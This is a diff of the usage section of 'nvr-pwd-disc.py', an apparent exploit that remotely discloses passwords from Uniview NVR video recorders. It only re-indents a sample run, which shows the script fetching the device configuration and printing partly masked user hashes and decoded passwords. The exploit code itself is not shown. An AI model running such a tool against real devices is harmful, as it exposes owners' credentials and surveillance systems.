@@ -25,25 +25,24 @@ Usage: python nvr-pwd-disc.py http://Host_or_IP:PORT
 
 Run example:
 
- root@k4li:~# python nvr-pwd-disc.py http://192.168.1.5
+	root@k4li:~# python nvr-pwd-disc.py http://192.168.1.5
+	Uniview NVR remote passwords disclosure!
+	Author: B1t0n
+	
+	[+] Getting model name and software version...
+		Model: NVR301-08-P8
+ 		Software Version: B3218P26C00512
 
- Uniview NVR remote passwords disclosure!
- Author: B1t0n
+ 	[+] Getting configuration file...
+ 	[+] Number of users found: 4
 
- [+] Getting model name and software version...
- Model: NVR301-08-P8
- Software Version: B3218P26C00512
+ 	[+] Extracting users' hashes and decoding reversible strings:
 
- [+] Getting configuration file...
- [+] Number of users found: 4
+ 	User 	|	 Hash 	|	 Password
+ 	_________________________________________________
+ 	admin 	|	3b9c687b1f4b9d87ed0fdd6a***** 	|	<TRIMMED>
+ 	default 	|	 	|	||||||||||||||||||||
+ 	HAUser 	|	288b836a37578141fea6527b5e***** 	|	123HAUser*****
+ 	test 	|	51b2454c681f3205f63b83720***** 	|	AA123pqrst*****
 
- [+] Extracting users' hashes and decoding reversible strings:
-
- User 	|	 Hash 	|	 Password
- _________________________________________________
- admin 	|	3b9c687b1f4b9d87ed0fdd6a***** 	|	<TRIMMED>
- default 	|	 	|	||||||||||||||||||||
- HAUser 	|	288b836a37578141fea6527b5e***** 	|	123HAUser*****
- test 	|	51b2454c681f3205f63b83720***** 	|	AA123pqrst*****
-
-  *Note that the users 'default' and 'HAUser' are default and sometimes inaccessible remotely
+  	*Note that the users 'default' and 'HAUser' are default and sometimes inaccessible remotely
